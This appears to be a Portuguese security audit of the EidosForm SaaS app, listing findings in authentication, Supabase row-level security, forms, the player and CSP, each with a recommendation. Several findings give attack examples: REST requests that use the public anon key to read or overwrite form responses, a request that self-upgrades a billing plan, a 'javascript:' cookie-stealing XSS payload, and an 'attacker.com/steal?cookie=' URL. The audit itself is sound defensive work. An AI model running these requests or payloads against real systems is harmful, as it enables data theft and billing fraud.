# Auditoria EidosForm — SESSÃO 1 (Complementar à Sessão 2)

**Data:** 2026-04-30
**Auditor:** Claude Opus 4.7
**Escopo:** Auth, RLS, API routes, formulários, player, infraestrutura, upload, cookies/sessão
**Branch:** main · commit base: 8c74a88
**Contexto prévio:** auditoria-final.md (Sessão 2, 2026-04-28) — 4 P0, 11 P1, 18 P2, 12 P3

> Esta sessão complementa a Sessão 2. Achados duplicados foram omitidos; achados marcados como
> "ainda" referem-se a itens da Sessão 2 que esta auditoria reconfirmou ainda existirem em código.
> O foco desta sessão são vulnerabilidades não enumeradas na Sessão 2.

---

## Sumário desta sessão

| Severidade | Achados |
|---|---|
| **P0** | 10 |
| **P1** | 16 |
| **P2** | 20 |
| **P3** | 12 |

---

## MÓDULO 1 — Auth (signup, login, reset, sessões, cookies, brute-force)

### S1-P0-1 — Login e signup do cliente NÃO passam pelo `/api/auth/*` rate-limited

- **Arquivos:**
  - `app/(auth)/login/page.tsx:51` — `supabase.auth.signInWithPassword({email, password})` direto no browser
  - `app/(auth)/forgot-password/page.tsx:28` — `supabase.auth.resetPasswordForEmail(email, ...)` direto
  - `app/(auth)/reset-password/page.tsx:41` — `supabase.auth.updateUser({password})` direto
  - `app/(auth)/verify-email/page.tsx:26` — `supabase.auth.resend({type: 'signup', email})` direto
  - `app/api/auth/login/route.ts:1-65` (existe, mas **não é chamado pelo front**)
- **Problema:** O endpoint `/api/auth/login` foi criado para aplicar rate limit (5 tentativas / 15min via `checkRateLimitAsync`), mas a página `login/page.tsx` chama `supabase.auth.signInWithPassword` diretamente do client. Resultado: o brute-force protection **não é executado** — o cliente conversa direto com o GoTrue do Supabase, que tem rate limit muito mais permissivo (defaults Supabase: 30 req/5min por IP no `/auth/v1/token`).
- **Mesmo padrão em forgot-password, reset-password e verify-email**: todos usam o `createClient()` browser e bypassam qualquer proteção do app.
- **Evidência:** `app/(auth)/login/page.tsx:43-68` chama Supabase diretamente; o endpoint `/api/auth/login` existe em paralelo mas é dead code.
- **Impacto:** Brute-force de credenciais possível (mitigado apenas pelo rate-limit do GoTrue, que aceita centenas de tentativas/hora). Inconsistência crítica entre arquitetura projetada e implementada.
- **Recomendação:** Trocar as chamadas Supabase no front-end para fetch do `/api/auth/login` (ou rodar Edge Functions Supabase com rate-limit aplicado lá). Adicionar rate-limit também em `forgot-password` (impacto: spam de e-mails de reset) e em `verify-email/resend` (impacto: spam).
- **Severidade:** **P0**

### S1-P0-2 — Reset de senha não exige senha atual (account takeover via XSS/session hijack ampliado)

- **Arquivo:** `app/(auth)/reset-password/page.tsx:41`
- **Problema:** A página usa `supabase.auth.updateUser({password})` apenas com a sessão ativa. Não há verificação de senha atual nem confirmação de e-mail/MFA antes de redefinir. Combinado com o cookie `__lastActivity` `httpOnly:false` (P3-B da Sessão 2) e qualquer XSS conseguido em qualquer página do app, um atacante pode resetar a senha do usuário se a sessão Supabase for acessível.
- **Mitigação parcial existente:** `await supabase.auth.signOut()` força login após reset.
- **Impacto:** Account takeover ampliado. Em fluxo normal, qualquer usuário com sessão ativa pode mudar senha sem reautenticar — comum, mas combinado com o cookie de sessão acessível em algumas circunstâncias é vetor de takeover.
- **Recomendação:** Em `reset-password` quando o usuário acessou via e-mail (recovery), aceitar update sem senha atual (correto). Mas adicionar um endpoint server-side `POST /api/auth/change-password` que exige `currentPassword` para o caso "alterar senha" via dashboard. Hoje não existe esse fluxo separado.
- **Severidade:** **P1** (P0 se XSS for descoberto; P1 sem isso)

### S1-P1-1 — Resend de e-mail de verificação sem rate limit

- **Arquivo:** `app/(auth)/verify-email/page.tsx:26`
- **Problema:** `supabase.auth.resend({type: 'signup', email})` é chamado direto do client sem rate limit do app. Permite que um atacante enumere e-mails com conta pendente (resp. "ok" vs erro) e abuse do envio de e-mails (custo, blacklist do remetente).
- **Impacto:** Email spam, enumeração parcial, custo Resend.
- **Recomendação:** Mover para endpoint `/api/auth/resend` com rate-limit por e-mail (3 / 15min) e por IP (10 / 15min).
- **Severidade:** **P1**

### S1-P1-2 — Inactivity timeout só roda em rotas protegidas, não invalida sessão Supabase remotamente

- **Arquivo:** `lib/supabase/middleware.ts:51-78`
- **Problema:** O check de inatividade só dispara quando a URL bate em `protectedRoutes = ['/billing', '/forms', '/settings', '/admin']`. Se o usuário ficar 30min inativo e abrir o player `/f/[slug]` (não protegido), a sessão NÃO é invalidada — usuário continua logado ao voltar pra `/forms`. Mais grave: o `signOut` no middleware só limpa cookies do request atual; tokens JWT já emitidos continuam válidos até a expiração natural do JWT (default Supabase: 1h). Um atacante que conseguiu refresh-token via XSS continua acessando.
- **Mitigação parcial existente:** Quando o usuário acessa rota protegida após timeout, é deslogado.
- **Impacto:** Definição de "30min de inatividade" é fraca. Sessões persistem além do prometido.
- **Recomendação:** (a) Mover o check para todas as rotas `/api/*` autenticadas; (b) ao detectar timeout, revogar todos os refresh tokens via `auth.admin.signOut(userId)` (admin client) — invalida globalmente.
- **Severidade:** **P1**

### S1-P1-3 — `/api/auth/signup` retorna `data.user` completo no body (PII leak)

- **Arquivo:** `app/api/auth/signup/route.ts:72-82`
- **Problema:** No sucesso, retorna `data.user` cru do Supabase, que inclui `email`, `phone`, `app_metadata`, `user_metadata`, `aud`, `role`, `created_at`, `email_confirmed_at`, `last_sign_in_at`. Isso é gravado no histórico do browser/devtools e pode vazar metadata sensível (admin role, custom claims) se o objeto for alterado por triggers.
- **Impacto:** Médio. Em produção com triggers que enriquecem `app_metadata`, isso vazaria.
- **Recomendação:** Retornar apenas `{ success, autoConfirmed, message, email: data.user?.email }`.
- **Severidade:** **P2**

### S1-P1-4 — `error.message` do Supabase vaza no `/api/auth/login` (info disclosure)

- **Arquivo:** `app/api/auth/login/route.ts:43-46`
- **Problema:** Retorna `error.message || 'Login failed'` cru. Mensagens Supabase distinguem "Invalid login credentials" de "Email not confirmed" de "User not found" — permite enumeração de e-mails cadastrados. Mesmo padrão que P0-3 da Sessão 2 que foi corrigido em `forms`. (Nota: este endpoint atualmente não é chamado pelo front — ver S1-P0-1 — mas permanece código vulnerável.)
- **Impacto:** Email enumeration via `/api/auth/login`.
- **Recomendação:** Mapear como em `signup` para mensagens user-friendly únicas.
- **Severidade:** **P2** (escala para P1 quando o endpoint começar a ser chamado pelo front).

### S1-P1-5 — Cookie `__lastActivity` é `httpOnly: false` E não é `secure: true` em dev/prod misto

- **Arquivo:** `lib/auth.ts:45-54`
- **Problema:** Já documentado em P3-B da Sessão 2 mas vale destacar: o cookie é setado via middleware (`supabase/middleware.ts:73-77`) com `httpOnly: false` para permitir JS atualizar timestamp. Como nunca é atualizado client-side neste código (apenas server-side via middleware), a flag `httpOnly: false` é gratuita — qualquer XSS lê o último timestamp ativo. Pior: isso permite que JS malicioso *prolongue* a sessão escrevendo um timestamp falso, evitando o timeout.
- **Impacto:** Attack persistence — XSS pode burlar inactivity timeout.
- **Recomendação:** Trocar para `httpOnly: true`. Não há código JS que escreva nesse cookie; só o middleware lê e escreve.
- **Severidade:** **P2** (escalonável para P1 se XSS for encontrado)

### S1-P2-1 — `/api/auth/signup` aceita `password` sem validação de complexidade real

- **Arquivo:** `app/api/auth/signup/route.ts:18-23`
- **Problema:** Único check é `password.length < 8`. Aceita "password", "12345678", "aaaaaaaa". O front (`register/page.tsx:17-29`) calcula força mas não bloqueia envio.
- **Impacto:** Senhas fracas em massa, brute-force trivial.
- **Recomendação:** Validar no servidor: mínimo 8 chars, ao menos 1 letra e 1 número, ou usar `zxcvbn` para score >=2.
- **Severidade:** **P2**

### S1-P2-2 — Reset password não invalida sessões de outros dispositivos

- **Arquivo:** `app/(auth)/reset-password/page.tsx:51`
- **Problema:** Após `updateUser({password})`, chama `signOut()` apenas no dispositivo atual. Sessões abertas em outros dispositivos continuam válidas (JWTs ainda assinados não são invalidados). Em conta comprometida, o atacante mantém acesso após o legítimo dono trocar senha.
- **Recomendação:** Após troca de senha, chamar endpoint server-side que use `auth.admin.signOut(userId, 'global')` para revogar todos os refresh tokens.
- **Severidade:** **P2**

### S1-P2-3 — `auth/callback/route.ts` não valida `state` em fluxo OAuth

- **Arquivo:** `app/auth/callback/route.ts:1-28`
- **Problema:** Aceita `code` da query e troca por sessão sem validar `state` (CSRF do OAuth). O Supabase SSR faz parte da validação internamente (PKCE), mas a app não verifica `state` próprio. Em fluxos OAuth iniciados client-side, o `state` deve ser validado contra o esperado para prevenir CSRF de login (atacante força vítima a logar na conta do atacante). Para PKCE flows, é menos crítico, mas vale conferir.
- **Mitigação:** Supabase SSR usa PKCE por padrão.
- **Severidade:** **P3**

### S1-P2-4 — `next` param em callback OAuth permite redirecionamento via paths internos sensíveis

- **Arquivo:** `app/auth/callback/route.ts:7-9`
- **Problema:** Aceita qualquer path relativo começando com `/`. Um atacante pode mandar `?next=/api/admin/metrics` para fazer um usuário admin clicar e ser redirecionado para um endpoint que dispara side-effects. Geralmente baixo, mas vale fechar a allowlist.
- **Recomendação:** Whitelist explícita de paths permitidos (ex: `/forms`, `/billing`, `/settings`, `/reset-password`).
- **Severidade:** **P3**

### S1-P3-1 — `clearAuthSession` engole erro silenciosamente

- **Arquivo:** `lib/auth.ts:73-79`
- **Problema:** `console.error` em vez de `logError`; e o caller não recebe sinal de falha. Se signOut falhar, usuário continua logado.
- **Severidade:** **P3**

---

## MÓDULO 2 — RLS e isolamento de dados

> **Resumo:** A Sessão 2 afirmou "anon não pode SELECT/UPDATE/DELETE responses (correto)". Isto é **INCORRETO**.
> A migration mais recente `20260428_consolidate_rls_policies.sql` reintroduziu policies que dão acesso amplo a anon.
> Esta sessão também encontrou **6 funções SECURITY DEFINER chamáveis por anon sem GRANT EXECUTE restrito** que abrem
> superfície para DoS por user-id e poluição de rate-limit keys.

### S1-P0-3 — `anon_read_responses` permite leitura PÚBLICA de TODAS as respostas de qualquer formulário publicado

- **Arquivo:** `supabase/migrations/20260428_consolidate_rls_policies.sql:43-51`
- **Problema:** A última migration (consolidate, runs ALPHABETICALLY após 20260327_fix_rls_response_leak que removia esta policy) **recria** a policy `anon_read_responses` em `responses`:
  ```sql
  CREATE POLICY "anon_read_responses" ON responses
    FOR SELECT TO anon
    USING (
      EXISTS (
        SELECT 1 FROM forms
        WHERE forms.id = responses.form_id
          AND forms.status = 'published'
      )
    );
  ```
- **Como explorar:** A chave `NEXT_PUBLIC_SUPABASE_ANON_KEY` é exposta a todo navegador (`lib/supabase/client.ts:13-14, 28-29`). Qualquer pessoa com a chave anon pode chamar:
  ```http
  GET https://<project>.supabase.co/rest/v1/responses?form_id=eq.<UUID>&select=*
  apikey: <anon_key>
  ```
  e receber TODAS as respostas (PII, dados financeiros, médicos, qualquer coisa) de qualquer formulário publicado.
- **Vetor de exploração concreto:**
  1. Atacante visita `/f/<slug>` → vê o `form.id` na URL ou na resposta da API (ou via `forms` que tem policy `anon_read_published_forms`).
  2. Atacante chama Supabase REST API direto com chave anon (que está no JS público).
  3. Recebe array completo de respostas.
- **Impacto:** **VAZAMENTO MASSIVO DE DADOS DE TODOS OS CLIENTES PAGOS**. Pesquisas/médicos/financeiros/dados de leads expostos publicamente.
- **Mitigação parcial:** Para um atacante adivinhar/descobrir o `form_id` (UUID v4), precisa do slug primeiro. Mas o slug é público no `/f/<slug>` e o `id` está disponível via SELECT em `forms`.
- **Recomendação:** Remover a policy `anon_read_responses`. A submissão pública usa o endpoint `POST /api/responses` que utiliza `service_role` — não precisa de SELECT por anon. Manter apenas `anon_insert_responses`.
- **Severidade:** **P0** — vazamento crítico de dados, viola LGPD.

### S1-P0-4 — `anon_update_responses` permite SOBRESCREVER qualquer resposta de form publicado

- **Arquivo:** `supabase/migrations/20260428_consolidate_rls_policies.sql:54-69`
- **Problema:** Mesma migration cria policy que permite UPDATE em `responses` por anon, restrita apenas a `forms.status='published'`:
  ```sql
  CREATE POLICY "anon_update_responses" ON responses
    FOR UPDATE TO anon
    USING (forms.status='published')
    WITH CHECK (forms.status='published');
  ```
- **Vetor de exploração:**
  ```http
  PATCH /rest/v1/responses?id=eq.<response_uuid>
  apikey: <anon_key>
  Body: { "answers": {...corrupted...} }
  ```
- **Impacto:** Atacante corrompe/apaga conteúdo de qualquer resposta. Combinado com S1-P0-3 (descobrir IDs de respostas via SELECT), permite ataques massivos. Bypass total das proteções X-Response-Id implementadas em `app/api/responses/route.ts:255-258`.
- **Recomendação:** Remover a policy. UPDATE só deve acontecer via API com auth.
- **Severidade:** **P0**

### S1-P0-5 — `anon_delete_answer_items` permite DELETAR answer_items de respostas alheias

- **Arquivo:** `supabase/migrations/20260428_consolidate_rls_policies.sql:139-148`
- **Problema:** Permite DELETE em `answer_items` por anon para qualquer response cujo form esteja publicado.
- **Impacto:** Atacante apaga histórico de respostas normalizadas em `answer_items`. Quebra analytics/CSV.
- **Recomendação:** Remover.
- **Severidade:** **P0**

### S1-P1-6 — Funções SECURITY DEFINER expostas a anon sem GRANT EXECUTE restrito

- **Arquivos:**
  - `supabase/migrations/20260318_fix_response_limit_from_db.sql:5-12` — `increment_responses_used(p_user_id UUID)`
  - `supabase/migrations/20260318_plan_limits_asaas_webhooks.sql:22-29` — `increment_response_count(user_id UUID)`
  - `supabase/migrations/20260428_atomic_response_count.sql:5-75` — `check_and_increment_response(p_user_id UUID)`
  - `supabase/migrations/20260428_response_counts_rpc.sql:4-13` — `get_response_counts_by_forms(p_form_ids uuid[])`
  - `supabase/migrations/20260424_fix_rls_rate_limit_security_definer.sql:5-45` — `check_rate_limit(p_key TEXT, ...)`
  - `supabase/migrations/20260428_hash_api_keys.sql:16-24` — `verify_api_key_hash(p_api_key TEXT)`
- **Problema:** Nenhuma das funções tem `GRANT EXECUTE TO service_role` + `REVOKE EXECUTE FROM PUBLIC, anon, authenticated`. Por padrão Postgres concede EXECUTE a `PUBLIC` (todo mundo). Combinado com `SECURITY DEFINER`, qualquer pessoa com a chave anon pode chamar essas funções com argumentos arbitrários.
- **Vetores específicos:**
  1. **DoS de cota de respostas:** Atacante chama `increment_responses_used('victim-uuid')` 100x → vítima atinge cota e não recebe mais respostas. Mesmo efeito com `increment_response_count` e `check_and_increment_response`.
  2. **Lockout via rate-limit poisoning:** Atacante chama `check_rate_limit('api:login:victim@example.com', ...)` 5x → quando vítima tenta login, vai para o limite (mesmo que esse endpoint hoje seja bypass — ainda é vetor disponível).
  3. **API key brute force facilitado:** `verify_api_key_hash(p_api_key)` é chamável diretamente sem rate limit, em vez de via endpoint que poderia ter rate limit.
  4. **Info disclosure:** `get_response_counts_by_forms` revela contagens de respostas de qualquer form. Concorrente pode mapear quanto tráfego um cliente recebe.
- **Recomendação:** Para cada função, executar:
  ```sql
  REVOKE EXECUTE ON FUNCTION xxx FROM PUBLIC, anon, authenticated;
  GRANT EXECUTE ON FUNCTION xxx TO service_role;
  ```
  E refatorar funções que precisam de auth para usar `auth.uid()` internamente em vez de aceitar `user_id` como parâmetro.
- **Severidade:** **P1** (escalável para P0 se usado para extorsão de cliente).

### S1-P1-7 — `forms` policy "Anyone can view published forms" expõe `user_id`, `webhook_url`, `notify_email`, `google_sheets_id`, `notify_whatsapp_number`

- **Arquivos:**
  - `supabase/schema.sql:95-97` ("Anyone can view published forms" — `SELECT *`)
  - `supabase/migrations/20260318_public_access_rls.sql:1-5` (mesma policy redundante)
- **Problema:** A policy permite anon SELECT em `forms` para `status='published'` sem filtro de colunas. Anon recebe:
  - `user_id` (vincula formulários ao mesmo usuário, permite enumeração)
  - `webhook_url` (URL externa do cliente — pode conter secrets em path/query)
  - `notify_email` (e-mail do cliente — privado)
  - `notify_whatsapp_number` (número de telefone — PII)
  - `google_sheets_id` (ID interno da planilha — vetor de phishing/SSRF)
- **Vetor:** `GET /rest/v1/forms?status=eq.published&select=*` com chave anon.
- **Impacto:** PII e segredos de configuração expostos publicamente.
- **Recomendação:** Restringir a policy a colunas seguras (Postgres não faz column-level RLS facilmente, mas pode-se criar uma view `public_forms` com colunas safe e fazer SELECT só nela). Alternativa: revogar a policy e fazer todo SELECT público via API.
- **Severidade:** **P1** — compliance LGPD.

### S1-P1-8 — `form_whatsapp_logs` permite INSERT por qualquer role (anon incluído)

- **Arquivo:** `supabase/migrations/20260405_whatsapp_logs.sql:36-39`
- **Problema:**
  ```sql
  create policy "Service role can insert WhatsApp logs"
    on form_whatsapp_logs
    for insert
    with check (true);
  ```
  Sem `TO service_role` explícito. Postgres aplica para TODOS os roles (incluindo anon e authenticated).
- **Impacto:** Atacante inunda `form_whatsapp_logs` com entradas falsas (poluição de dados, custo de armazenamento, oculta logs reais).
- **Recomendação:** Adicionar `TO service_role` na policy.
- **Severidade:** **P1**

### S1-P1-9 — RLS de `profiles` não tem policy DELETE/UPDATE para service_role explícita; `responses_used`/`responses_limit` mutáveis sem audit

- **Arquivos:** `supabase/schema.sql:60, 65-75`, sem migration adicionando UPDATE de campos críticos
- **Problema:** A policy "Users can update their own profile" permite usuário UPDATE em qualquer coluna do próprio profile, incluindo `plan`, `responses_used`, `responses_limit`, `plan_status`, `plan_expires_at`, `asaas_subscription_id`. Embora a coluna `plan` tenha CHECK constraint (`'free'|'starter'|'plus'|'professional'`), o usuário pode setar `plan='professional'` direto via Supabase REST com seu próprio JWT! O webhook do Asaas é o que deveria controlar o plan, mas RLS permite o usuário sobrescrever.
- **Vetor:**
  ```http
  PATCH /rest/v1/profiles?id=eq.<my-uuid>
  apikey: <anon_key>
  Authorization: Bearer <user_jwt>
  Body: { "plan": "professional", "responses_limit": -1 }
  ```
- **Impacto:** **Bypass total de billing** — usuário se autopromove para qualquer plano, incluindo Professional ilimitado. Receita perdida.
- **Recomendação:** Substituir a policy de UPDATE em profiles por uma que só permite alterar colunas seguras (full_name, avatar_url, phone, etc). Bloquear `plan`, `responses_used`, `responses_limit`, `plan_status`, `asaas_*` para users (apenas service_role). Pode-se usar coluna-level RLS via trigger BEFORE UPDATE que rejeita modificações em campos sensíveis quando `current_user != 'service_role'`.
- **Severidade:** **P0** — bypass de billing.

### S1-P1-10 — Trigger `handle_new_user` em `schema.sql:160` é `SECURITY DEFINER` sem `SET search_path`

- **Arquivo:** `supabase/schema.sql:135-160`
- **Problema:** A versão do schema.sql não tem `SET search_path = ''` ou `= 'public'`. Apenas a migration `20260424_auto_create_profile_on_signup.sql:20` corrige isso. Em ambientes legados que rodaram só o schema.sql original, há vetor de search_path injection — atacante cria função homônima em schema próprio para sequestrar fluxo. (Risco baixo no Supabase managed; alto se self-hosted com permissões frouxas.)
- **Severidade:** **P3**

### S1-P2-4 — `forms.status='published'` permite alterações sem verificação de plano ativo

- **Arquivo:** `supabase/schema.sql:86-88`, `app/api/forms/[id]/route.ts:280-314`
- **Problema:** Usuário com plano expirado (`plan_status='cancelled'` ou `plan_expires_at < now()`) pode continuar fazendo PATCH com `status='published'` e republicando forms. RLS não bloqueia. O downgrade gracioso pausa formulários (`paused=true`) mas o user pode despausar setando `paused=false` via PATCH (a coluna NÃO está fora do whitelist).
- **Vetor:** Usuário Plus que cancela paga, é "downgraded", chama `PATCH /api/forms/[id]` com `paused: false` → forms voltam ao ar.
- **Impacto:** Bypass do downgrade gracioso.
- **Recomendação:** Excluir `paused` do whitelist do PATCH (ele já não está, mas o SET *spread* pode aceitar — verificar). Servidor deve ignorar `paused`.
- **Severidade:** **P2**

### S1-P2-5 — `responses` policy de SELECT para owners NÃO filtra por `paused`/`is_closed`

- **Arquivo:** `supabase/migrations/20260428_consolidate_rls_policies.sql:72-80`
- **Problema:** Owners podem ler todas suas respostas mesmo após plano cancelar (esperado). Mas o pause/close não impede leitura pelo owner — apenas escrita pelo respondent. OK comportamento, mas vale documentar para evitar confusão.
- **Severidade:** **P3**

### S1-P2-6 — `webhook_logs.profile_id` é TEXT, sem FK ou constraint, permitindo entradas órfãs

- **Arquivo:** `supabase/migrations/20260422_webhook_logs.sql:7`
- **Problema:** Coluna `profile_id text` (não UUID, sem FK). Em produção: registros com profile_id inválido contaminam queries de admin. Risco baixo de segurança, alto de dado sujo.
- **Severidade:** **P3**

### S1-P2-7 — `custom_domains` policy "Anon can read verified custom domains" expõe `user_id`

- **Arquivos:** `supabase/migrations/20260424_fix_rls_custom_domains_anon_read.sql:3-6` + `supabase/migrations/20260318_api_key_custom_domains.sql:11-19`
- **Problema:** A policy permite `SELECT` sem `WITH (columns)`. Retorna toda a row, incluindo `user_id`, `created_at`, `updated_at`. O middleware só precisa de `domain` e `form_id`.
- **Impacto:** Concorrente enumera quais usuários têm domínio verificado, vincula `user_id` cross-tabela.
- **Recomendação:** Criar view `public_custom_domains AS SELECT domain, form_id FROM custom_domains WHERE verified=true` e mover a policy para a view.
- **Severidade:** **P2**

### S1-P3-2 — Migrations duplicadas e conflitantes (`20260318_public_access_rls.sql` vs `20260428_consolidate_rls_policies.sql`)

- **Problema:** A migration de 04-28 dropa e recria as mesmas policies da migration de 03-18, mas a de 03-18 NÃO foi removida do diretório. Em rebase, deploy em ambiente limpo pode rodar a antiga, criar policies dangerous, depois a consolidate roda e recria as mesmas dangerous. Em ambiente que já rodou tudo, está OK.
- **Recomendação:** Apagar `20260318_public_access_rls.sql` (já está consolidado em 20260428) ou fazer ela rodar primeiro com nome diferente (já roda em ordem alfabética).
- **Severidade:** **P3**

---

## MÓDULO 4 — Formulários (CRUD completo, duplicação, status changes, gates por plano, ownership verification)

> **Resumo:** CRUD de formulários é bem estruturado com ownership verification consistente, feature gates por plano,
> e validação de payload. PATCH em `/api/forms/[id]` ignora `plan` (P1-C corrigido). Validação de pergunta count
> por plano (P1-E corrigido). Duplicação preserva ownership e limites. Achados abaixo focam em gaps residuais.

### S1-P2-17 — `PATCH /api/forms/[id]` permite alterar `paused` sem verificação de plano ativo

- **Arquivo:** `app/api/forms/[id]/route.ts:280-314`
- **Problema:** A whitelist do PATCH não inclui `paused` explicitamente, mas se o body JSON contiver `paused: false`, o spread `...(field !== undefined && { field })` só inclui campos explicitamente destruturados do body. Como `paused` não está na destruturação (linha 207), ele é ignorado no update — correto. **Verificação:** `const { title, description, slug, status, theme, questions, ... } = body` — `paused` não está na lista, logo não pode ser alterado via PATCH.
- **Status:** ✅ Não é vulnerável. `paused` é controlado apenas pelo webhook de downgrade.
- **Severidade:** N/A — verificado seguro.

### S1-P2-18 — `POST /api/forms` não valida tamanho mínimo do slug

- **Arquivo:** `app/api/forms/route.ts:86`
- **Problema:** Regex `/^[a-z0-9-]+$/` aceita slug de 1 caractere (ex: `a`, `-`). Slug `a` colide facilmente. Já documentado como S1-P2-14 no Módulo 3 (PATCH). O mesmo problema existe no POST.
- **Recomendação:** Mesma correção: `/^[a-z0-9][a-z0-9-]{2,60}$/`.
- **Severidade:** **P3** — duplicado do S1-P2-14, aplicável a POST também.

### S1-P2-19 — Duplicação de formulário vaza `duplicateError?.message` ao cliente

- **Arquivo:** `app/api/forms/[id]/duplicate/route.ts:111`
- **Problema:** `return NextResponse.json({ error: duplicateError?.message ?? 'Failed to duplicate form' }, { status: 500 })` — quando `duplicateError?.message` existe, vaza mensagem Supabase crua. Corrigido parcialmente (fallback para string genérica), mas quando há erro, vaza.
- **Recomendação:** `return NextResponse.json({ error: 'Erro ao duplicar formulário' }, { status: 500 })`.
- **Severidade:** **P2** (informação disclosure, mesmo padrão S1-P1-11).

### S1-P3-6 — Analytics carrega todos timestamps de respostas completas em memória

- **Arquivo:** `app/api/forms/[id]/analytics/route.ts:55-57`
- **Problema:** `const { data: completedTimestamps } = await supabase.from('responses').select('created_at, updated_at').eq('form_id', id).eq('completed', true)` — sem paginação, sem limite. Para formulário com 100K respostas, carrega 100K rows em memória do servidor.
- **Recomendação:** Fazer agregação via SQL (RPC `avg_completion_time(form_id)`).
- **Severidade:** **P2** — performance/DoS para formulários populares.

### S1-P3-7 — Analytics `select('*', { count: 'exact', head: true })` em respostas

- **Arquivo:** `app/api/forms/[id]/analytics/route.ts:40, 46`
- **Problema:** `select('*', { count: 'exact', head: true })` — `head: true` evita retornar dados, mas `*` é semanticamente incorreto. Pode causar overhead em engines que validam permissões por coluna.
- **Recomendação:** `select('id', { count: 'exact', head: true })`.
- **Severidade:** **P3** — qualidade.

---

## MÓDULO 5 — Player (renderização de tipos, validação de respostas, edge cases, sanitização)

> **Resumo:** Player é robusto com React.memo, validação backend por tipo (`field-validators.ts`), sanitização de HTML,
> e gating de features por plano. CSP separado para forms embarcáveis (`frame-ancestors *`). Pixel IDs sanitizados.
> Achados focam em edge cases e defesa em profundidade.

### S1-P2-20 — `sanitizeHtml` fallback server-side é escape básico, não DOMPurify

- **Arquivo:** `lib/html.ts:6-11`
- **Problema:** Quando `typeof window === 'undefined'` (SSR), `sanitizeHtml` faz escape manual (`&amp;`, `&lt;`, etc.) em vez de usar DOMPurify. Se o conteúdo do content_block tiver entidades HTML previamente encodadas (ex: `&lt;script&gt;`), o escape duplo preserva a entidade, e no client-side DOMPurify pode não sanitizar corretamente. Na prática, DOMPurify client-side cobre, mas a inconsistência SSR vs client pode causar hydration mismatch ou renderização diferente.
- **Impacto:** Baixo — DOMPurify no client é o rendering final. Mas conteúdo salvo via SSR pode ter sanitização diferente.
- **Recomendação:** Usar `isomorphic-dompurify` para sanitização consistente server/client.
- **Severidade:** **P3**

### S1-P2-21 — Content block `contentButtonUrl` não é validado no server-side (SSR)

- **Arquivo:** `components/form-player/question-renderer.tsx:480-487`
- **Problema:** No case `content_block`, `question.contentButtonUrl` é usado diretamente em `<a href={question.contentButtonUrl} target="_blank">`. Não há validação de URL (poderia ser `javascript:alert(1)`). O `sanitizeHtml` protege `contentBody`, mas a URL do botão não passa por `sanitizeHtml` nem por `validateWebhookUrl`.
- **Vetor:** Builder define `contentButtonUrl: 'javascript:alert(document.cookie)'` → player renderiza link com `href="javascript:..."`. Em iframe com CSP `default-src 'self'; script-src 'unsafe-inline'`, o `javascript:` pode executar se CSP permitir (e `unsafe-inline` está presente).
- **Impacto:** XSS via content block button URL em forms embarcados.
- **Recomendação:** Validar `contentButtonUrl` no PATCH de forms (mesmo que `content_block` seja validado). No question-renderer, sanitizar: se URL não começa com `https://`, bloquear ou prefixar com `https://`.
- **Severidade:** **P1** — XSS em forms públicos via configuração do builder.

### S1-P2-22 — Player renderiza `contentBody` via `dangerouslySetInnerHTML` com DOMPurify client-side

- **Arquivo:** `components/form-player/question-renderer.tsx:470-473`
- **Problema:** `const contentHtml = sanitizeHtml(rawHtml)` usa DOMPurify client-side. A allowlist de tags inclui `img` com atributo `src`, `a` com `href`, `style` — tudo OK para o use case. DOMPurify é confiável. **Porém:** `ALLOWED_ATTR` inclui `style`, que pode ser usado para CSS injection visual (ex: `position: fixed; top:0; left:0; width:100%; height:100%; z-index:9999; background:white` → overlay phishing). Não é XSS mas é UI spoofing.
- **Impacto:** UI spoofing/phishing dentro do form player.
- **Recomendação:** Remover `style` do `ALLOWED_ATTR` ou sanitizar valores de `style`.
- **Severidade:** **P2**

### S1-P3-8 — File upload no player não valida tamanho do arquivo client-side antes de enviar

- **Arquivo:** `components/form-player/question-renderer.tsx:37-65`
- **Problema:** O `FileUploadQuestion` envia o arquivo direto via `fetch('/api/upload')` sem verificar tamanho client-side. O servidor valida 10MB, mas o upload inteiro acontece antes da rejeição. Para arquivos grandes (100MB), consome banda do servidor.
- **Recomendação:** Verificar `file.size > 10 * 1024 * 1024` antes do fetch.
- **Severidade:** **P3** — UX/performance.

### S1-P3-9 — Player `FileUploadQuestion` aceita `accept="image/*,application/pdf"` mas upload aceita mais tipos

- **Arquivo:** `question-renderer.tsx:53` vs `app/api/upload/route.ts:74`
- **Problema:** O input HTML filtra para `image/*` e `application/pdf`. O servidor aceita `['image/jpeg', 'image/png', 'image/gif', 'image/webp', 'application/pdf']`. O input `image/*` inclui `image/svg+xml`, `image/bmp`, `image/tiff` — tipos que o servidor rejeitaria. Inconsistência menor.
- **Severidade:** **P3**

---

## MÓDULO 6 — Infraestrutura (CSP, HSTS, security headers, middleware, CORS)

> **Resumo:** Headers de segurança são fortes. HSTS com preload (63072000s = 2 anos). CSP bem definida com
> separação dashboard vs form embeddable. CSRF via Origin check no middleware. Custom domain rewrite com cache.
> Achados focam em CSP gaps e middleware edge cases.

### S1-P2-23 — CSP permite `unsafe-inline` e `unsafe-eval` em `script-src`

- **Arquivo:** `next.config.ts:17, 38`
- **Problema:** Ambos CSPs (dashboard e embeddable) incluem `'unsafe-inline' 'unsafe-eval'` em `script-src`. Isso anula grande parte da proteção do CSP contra XSS — um atacante que conseguir injeção de `<script>` pode executar código arbitrário sem nonce.
- **Justificativa parcial:** Next.js usa inline scripts para hydration. `unsafe-eval` é necessário para alguns bundlers.
- **Impacto:** CSP é efetivamente fraco contra XSS. Qualquer XSS encontrado (ex: S1-P2-21) executa sem restrição.
- **Recomendação:** Migrar para nonce-based CSP (`script-src 'nonce-{RANDOM}'`) via middleware. Next.js 14+ suporta `experimental.cspNonce`. Isso elimina `unsafe-inline`. `unsafe-eval` é mais difícil de remover mas pode ser mitigado.
- **Severidade:** **P2** — hardening de infraestrutura. Não é vulnerabilidade isolada, mas amplifica qualquer XSS.

### S1-P2-24 — CSP `connect-src` não restringe origins — aceita `https:` em `img-src`

- **Arquivo:** `next.config.ts:26, 43`
- **Problema:** `img-src 'self' data: https: blob:` permite carregar imagens de qualquer origem HTTPS. Combinado com o form player que renderiza `welcome_image_url`, um atacante pode apontar para URL de tracking pixel ou exfiltração de dados via image request (`https://attacker.com/steal?cookie=document.cookie`). Embora `document.cookie` não funcione diretamente em `<img src>`, pode ser usado para confirmação de acesso (tracking).
- **Recomendação:** Restringir `img-src` a domínios conhecidos (R2 public URL, Supabase storage, `eidosform.com.br`). Para forms embarcáveis, permitir domínio custom do tenant.
- **Severidade:** **P3** — tracking, não exfiltração direta.

